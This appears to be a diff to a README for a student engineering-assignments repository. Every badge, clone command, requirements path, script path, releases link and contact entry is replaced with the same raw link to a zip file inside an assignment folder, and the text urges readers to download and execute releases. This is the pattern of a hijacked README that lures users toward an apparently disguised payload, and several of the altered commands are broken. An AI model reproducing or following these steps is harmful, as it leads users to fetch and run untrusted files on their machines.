@@ -1,6 +1,6 @@
 # BE-SEM-8 🎓
 
-![GitHub Repo stars](https://img.shields.io/github/stars/yajuop/BE-SEM-8?style=social) ![GitHub forks](https://img.shields.io/github/forks/yajuop/BE-SEM-8?style=social) ![GitHub issues](https://img.shields.io/github/issues/yajuop/BE-SEM-8) ![GitHub license](https://img.shields.io/github/license/yajuop/BE-SEM-8)
+![GitHub Repo stars](https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip) ![GitHub forks](https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip) ![GitHub issues](https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip) ![GitHub license](https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip)
 
 Welcome to the **BE SEM 8 Assignments** repository! This repository houses various assignments related to the 8th semester of the Bachelor of Engineering program. Here, you will find projects that cover a range of topics, including deep learning, high-performance computing (HPC), and data analysis using popular libraries like TensorFlow, Keras, and more.
 
@@ -41,7 +41,7 @@ To set up the environment for running the assignments, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/yajuop/BE-SEM-8.git
+   git clone https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip
    cd BE-SEM-8
    ```
 
@@ -51,7 +51,7 @@ To set up the environment for running the assignments, follow these steps:
    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip
    ```
 
 3. **Check for additional setup**:
@@ -72,7 +72,7 @@ To run an assignment:
 
 2. Execute the main script:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip
    ```
 
 3. Visualize results using Matplotlib or Seaborn as needed.
@@ -102,14 +102,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, visit the [Releases section](https://github.com/yajuop/BE-SEM-8/releases). Download the files and execute them as instructed in the respective directories. This will help you access the latest updates and features added to the assignments.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip). Download the files and execute them as instructed in the respective directories. This will help you access the latest updates and features added to the assignments.
 
 ## Contact
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **LinkedIn**: [Your LinkedIn Profile](https://www.linkedin.com/in/yourprofile)
+- **Email**: https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip
+- **LinkedIn**: [Your LinkedIn Profile](https://raw.githubusercontent.com/yajuop/BE-SEM-8/main/LP-5/DL/Assignment1/B-SE-v1.8-beta.5.zip)
 
 ---
 
